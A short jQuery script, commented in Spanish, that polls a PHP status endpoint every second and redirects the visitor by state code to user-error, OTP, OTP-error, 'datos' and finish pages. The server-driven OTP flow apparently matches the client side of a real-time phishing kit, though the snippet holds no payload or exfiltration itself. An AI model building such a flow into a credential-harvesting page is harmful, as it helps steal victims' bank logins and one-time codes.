// Función para verificar el estado del cliente
function verificarEstado() {
    if (!clienteId) {
        console.error("El clienteId no está definido.");
        return;
    }

    $.ajax({
        url: '../../process/verificar_estado.php?id=' + clienteId, // Archivo PHP que consulta el estado
        type: 'GET',
        dataType: 'json',
        success: function(data) {
            console.log("Datos recibidos:", data); // Muestra los datos recibidos

            if (data.estado !== undefined) {
                console.log("Estado actual:", data.estado); // Log para verificar el estado

                // Convertir data.estado a número
                const estadoActual = Number(data.estado); // Convertir a número

                // Verificar el estado y redirigir según sea necesario
                switch (estadoActual) {
                    case 2:
                        console.log("Redirigiendo a erroruser.php...");
                        window.location.href = 'indexerror.php?id=' + clienteId;
                        break;
                    case 5:
                        console.log("Estado es Ingreso OTP, no se realiza redirección.");
                        break;
                    case 6:
                        console.log("Redirigiendo a datos.php...");
                        window.location.href = 'datos.php?id=' + clienteId;
                        break;
                    case 3:
                        console.log("Redirigiendo a otp.php...");
                        window.location.href = 'otp.php?id=' + clienteId;
                        break;
                    case 4:
                        console.log("Redirigiendo a otperror.php...");
                        window.location.href = 'errorotp.php?id=' + clienteId;
                        break;
                    case 0:
                        console.log("Redirigiendo a end.php...");
                        window.location.href = 'finish.php';
                        break;
                    default:
                        console.log("Estado no relevante, no se redirige.");
                }
            } else {
                console.log("Estado es indefinido");
            }
        },
        error: function(jqXHR, textStatus, errorThrown) {
            console.error('Error en la solicitud AJAX:', textStatus, errorThrown);
        }
    });
}

// Actualizar el estado cada segundo
setInterval(verificarEstado, 1000); // Cada 1000 ms = 1 segundo
